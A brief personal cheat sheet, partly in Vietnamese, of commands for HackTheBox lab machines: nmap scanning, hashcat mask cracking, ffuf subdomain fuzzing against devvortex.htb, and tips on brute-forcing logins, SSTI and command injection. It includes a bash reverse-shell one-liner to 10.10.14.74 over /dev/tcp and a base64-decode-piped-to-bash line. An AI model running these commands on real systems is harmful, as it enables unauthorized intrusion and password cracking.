# HackTheBox

# nmap

nmap -A

# set hosts

window: C:\Windows\System32\drivers\etc
linux: /etc/hosts

# hash

`hashid hash.txt` để detect loại hash, xong dùng `hashcat`

brute force hash có dạng số theo sau:
`hashcat -a 3 -m 1400 hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d`

# ffuf

```
ffuf -c -ic -w /usr/share/wordlists/dirb/big.txt -u http://devvortex.htb  -H "HOST:FUZZ.devvortex.htb" -fs 154
```

# reverse shell

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.74/1337 0>&1'
```

```
echo bHM= |base64 -d|bash
```

# Kinh nghiệm

- login page: brute force, default account (tùy công nghệ)
- input: SSTI, command injection
- check `/var/mail` lấy thông tin mail nếu có
- fuzz subdomain
- vào sqldatase
